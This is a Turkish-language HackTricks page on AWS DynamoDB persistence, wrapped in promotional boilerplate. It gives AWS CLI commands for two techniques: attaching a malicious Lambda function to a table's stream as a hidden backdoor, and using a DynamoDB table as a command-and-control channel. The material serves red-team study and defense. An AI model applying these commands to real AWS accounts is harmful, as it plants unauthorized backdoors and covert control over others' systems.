# AWS - DynamoDB Persistence

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

### DynamoDB

Daha fazla bilgi için erişim sağlayın:

{% content-ref url="https://github.com/carlospolop/hacktricks-cloud/blob/tr/pentesting-cloud/aws-security/aws-hizmetleri/aws-veritabanlar%C4%B1/aws-dynamodb-enum.md" %}
[https://github.com/carlospolop/hacktricks-cloud/blob/tr/pentesting-cloud/aws-security/aws-hizmetleri/aws-veritabanları/aws-dynamodb-enum.md](https://github.com/carlospolop/hacktricks-cloud/blob/tr/pentesting-cloud/aws-security/aws-hizmetleri/aws-veritabanlar%C4%B1/aws-dynamodb-enum.md)
{% endcontent-ref %}

### Lambda Arka Kapı ile DynamoDB Tetikleyicileri

DynamoDB tetikleyicilerini kullanarak, saldırgan bir tabloya kötü niyetli bir Lambda işlevi atayarak **gizli bir arka kapı** oluşturabilir. Lambda işlevi, bir öğe eklenir, değiştirilir veya silindiğinde tetiklenebilir, bu da saldırganın AWS hesabı içinde keyfi kodu yürütmesine olanak tanır.

{% code overflow="wrap" %}
```bash
# Create a malicious Lambda function
aws lambda create-function \
--function-name MaliciousFunction \
--runtime nodejs14.x \
--role <LAMBDA_ROLE_ARN> \
--handler index.handler \
--zip-file fileb://malicious_function.zip \
--region <region>

# Associate the Lambda function with the DynamoDB table as a trigger
aws dynamodbstreams describe-stream \
--table-name TargetTable \
--region <region>

# Note the "StreamArn" from the output
aws lambda create-event-source-mapping \
--function-name MaliciousFunction \
--event-source <STREAM_ARN> \
--region <region>
```
{% endcode %}

Kalıcılığı sürdürmek için saldırgan, DynamoDB tablosunda öğeler oluşturabilir veya değiştirebilir, bu da kötü niyetli Lambda işlevini tetikler. Bu, saldırganın Lambda işleviyle doğrudan etkileşim olmaksızın AWS hesabı içinde kodu yürütmesine olanak tanır.

### DynamoDB Bir C2 Kanalı Olarak

Bir saldırgan, komutları içeren öğeler oluşturarak ve bu komutları almak ve yürütmek için etkilenmiş örnekler veya Lambda işlevleri kullanarak DynamoDB tablosunu bir **komut ve kontrol (C2) kanalı** olarak kullanabilir.

```bash
# Create a DynamoDB table for C2
aws dynamodb create-table \
--table-name C2Table \
--attribute-definitions AttributeName=CommandId,AttributeType=S \
--key-schema AttributeName=CommandId,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--region <region>

# Insert a command into the table
aws dynamodb put-item \
--table-name C2Table \
--item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
--region <region>
```

Kompromize edilen örnekler veya Lambda fonksiyonları, yeni komutları kontrol etmek için C2 tablosunu periyodik olarak kontrol edebilir, bunları gerçekleştirebilir ve isteğe bağlı olarak sonuçları tabloya rapor edebilir. Bu, saldırganın kompromize edilen kaynaklar üzerinde süreklilik ve kontrol sağlamasını sağlar.

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
